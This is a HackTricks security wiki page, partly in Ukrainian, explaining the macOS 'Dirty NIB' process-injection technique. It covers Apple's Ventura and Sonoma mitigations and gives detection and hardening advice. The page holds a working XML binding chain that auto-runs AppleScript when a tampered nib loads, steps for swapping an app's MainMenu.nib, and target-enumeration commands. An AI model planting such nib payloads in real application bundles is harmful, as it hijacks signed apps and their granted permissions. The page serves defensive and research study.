# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB refers to abusing Interface Builder files (.xib/.nib) inside a signed macOS app bundle to execute attacker-controlled logic inside the target process, thereby inheriting its entitlements and TCC permissions. This technique was originally documented by xpn (MDSec) and later generalized and significantly expanded by Sector7, who also covered Apple’s mitigations in macOS 13 Ventura and macOS 14 Sonoma. For background and deep dives, see the references at the end.

> TL;DR
> • Before macOS 13 Ventura: replacing a bundle’s MainMenu.nib (or another nib loaded at startup) could reliably achieve process injection and often privilege escalation.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, and the new TCC “App Management” permission largely prevent post‑launch nib tampering by unrelated apps. Attacks may still be feasible in niche cases (e.g., same‑developer tooling modifying own apps, or terminals granted App Management/Full Disk Access by the user).


## Що таке NIB/XIB файли

Nib (short for NeXT Interface Builder) файли — серіалізовані графи UI-об'єктів, що використовуються AppKit додатками. Сучасний Xcode зберігає редаговані XML .xib файли, які під час збірки компілюються в .nib. Типовий додаток завантажує головний UI через `NSApplicationMain()`, яка читає ключ `NSMainNibFile` з Info.plist додатку і створює граф об'єктів під час виконання.

Ключові моменти, що дозволяють атаку:
- Завантаження NIB створює екземпляри довільних Objective‑C класів, не вимагаючи їхньої відповідності NSSecureCoding (nib loader Apple відкатується до `init`/`initWithFrame:`, якщо `initWithCoder:` недоступний).
- Cocoa Bindings можна зловживати для виклику методів під час інстанціювання nib, включно з ланцюговими викликами, що не вимагають взаємодії користувача.


## Процес ін'єкції Dirty NIB (з погляду нападника)

Класичний хід до Ventura:
1) Створити шкідливий .xib
- Додати об'єкт `NSAppleScript` (або інші “gadget” класи такі як `NSTask`).
- Додати `NSTextField`, чий title містить payload (наприклад, AppleScript або аргументи команди).
- Додати один або кілька `NSMenuItem` об'єктів, підключених через bindings для виклику методів на цільовому об'єкті.

2) Автозапуск без кліків користувача
- Використати bindings для встановлення target/selector пункту меню і потім викликати приватний метод `_corePerformAction`, щоб дія виконалася автоматично при завантаженні nib. Це усуває потребу в кліку користувача.

Мінімальний приклад ланцюга автозапуску всередині .xib (скорочено для ясності):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Це дозволяє виконувати довільний AppleScript у цільовому процесі під час завантаження nib. Більш складні ланцюжки можуть:
- Ініціювати довільні класи AppKit (наприклад, `NSTask`) і викликати методи без аргументів, такі як `-launch`.
- Викликати довільні селектори з об'єктними аргументами за допомогою трюку прив'язки, описаного вище.
- Завантажити AppleScriptObjC.framework для з'єднання з Objective‑C і навіть виклику вибраних C APIs.
- На старіших системах, які ще містять Python.framework, перейти до Python і використовувати `ctypes` для виклику довільних C-функцій (дослідження Sector7).

3) Replace the app’s nib
- Скопіюйте target.app у місце з правами на запис, замініть, наприклад, `Contents/Resources/MainMenu.nib` на шкідливий nib і запустіть target.app. Pre‑Ventura, після одноразової перевірки Gatekeeper, подальші запуски виконували лише поверхневі перевірки підпису, тому не виконувані ресурси (наприклад, .nib) не перевірялися повторно.

Приклад AppleScript payload для видимого тесту:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple introduced several systemic mitigations that dramatically reduce the viability of Dirty NIB in modern macOS:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- При першому запуску будь‑якого додатка (quarantined або ні) виконується глибока перевірка підпису, яка охоплює всі bundle ресурси. Після цього bundle стає захищеним: лише додатки від того ж розробника (або явно дозволені самим додатком) можуть змінювати його вміст. Іншим додаткам потрібен новий TCC «App Management» дозвіл, щоб записувати у bundle іншого додатка.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps не можна скопіювати кудись ще й запустити; це вбиває підхід «copy to /tmp, patch, run» для системних додатків.
- Improvements in macOS 14 Sonoma
- Apple посилила App Management і виправила відомі обхідні шляхи (наприклад, CVE‑2023‑40450), помічені Sector7. Python.framework було видалено раніше (macOS 12.3), що зламало деякі privilege‑escalation ланцюги.
- Gatekeeper/Quarantine changes
- Для ширшого обговорення Gatekeeper, provenance та assessment змін, які вплинули на цю техніку, див. сторінку, вказану нижче.

> Practical implication
> • На Ventura+ ви загалом не можете змінити .nib стороннього додатка, якщо ваш процес не має App Management або не підписаний тим самим Team ID, що й ціль (наприклад, developer tooling).
> • Надання App Management або Full Disk Access shell'ам/terminals фактично знову відкриває цю поверхню атаки для всього, що може виконувати код у контексті цього термінала.


### Addressing Launch Constraints

Launch Constraints блокують запуск багатьох Apple додатків із нестандартних локацій починаючи з Ventura. Якщо ви покладалися на робочі процеси до Ventura, наприклад копіювання Apple app у тимчасовий каталог, модифікацію `MainMenu.nib` і запуск, очікуйте, що це не спрацює на версіях >= 13.0.


## Enumerating targets and nibs (useful for research / legacy systems)

- Locate apps whose UI is nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Знайти кандидатні nib-ресурси всередині bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Ретельно перевіряйте підписи коду (перевірка не пройде, якщо ви внесли зміни в ресурси і не підписали їх наново):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Примітка: На сучасних macOS вас також заблокує bundle protection/TCC, якщо ви спробуєте записати в bundle іншого додатка без належної авторизації.


## Виявлення та поради DFIR

- Моніторинг цілісності файлів для bundle resources
- Слідкуйте за змінами mtime/ctime у `Contents/Resources/*.nib` та інших не‑виконуваних ресурсах встановлених додатків.
- Уніфіковані логи та поведінка процесів
- Моніторьте несподіване виконання AppleScript всередині GUI‑додатків та процеси, які завантажують AppleScriptObjC або Python.framework. Приклад:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Проактивні перевірки
- Періодично запускайте `codesign --verify --deep` для критичних додатків, щоб переконатися, що ресурси залишаються цілими.
- Контекст привілеїв
- Аудитуйте, хто/що має TCC “App Management” або Full Disk Access (особливо термінали та агенти управління). Видалення таких прав з універсальних shell‑ів перешкоджає тривіальному повторному увімкненню Dirty NIB‑style tampering.


## Зміцнення захисту (розробникам і захисникам)

- Віддавайте перевагу програмній UI або обмежуйте те, що інстанціюється з nibs. Уникайте включення потужних класів (наприклад, `NSTask`) у nib‑графи та уникайте bindings, які опосередковано викликають селектори на довільних об’єктах.
- Використовуйте hardened runtime з Library Validation (вже стандарт для сучасних додатків). Хоча це саме по собі не зупиняє nib injection, воно блокує просте завантаження рідного коду і змушує нападників використовувати лише скриптові payload‑и.
- Не запитуйте і не покладайтеся на широкі дозволи App Management у загального призначення інструментах. Якщо MDM вимагає App Management, сегрегуйте цей контекст від користувацьких shell‑ів.
- Регулярно перевіряйте цілісність вашого app bundle і робіть механізми оновлення таким чином, щоб вони самі відновлювали ресурси bundle.


## Пов'язані матеріали в HackTricks

Дізнайтеся більше про зміни Gatekeeper, quarantine та provenance, що впливають на цю техніку:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Посилання

- xpn – DirtyNIB (оригінальний опис з прикладом для Pages): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 квітня 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
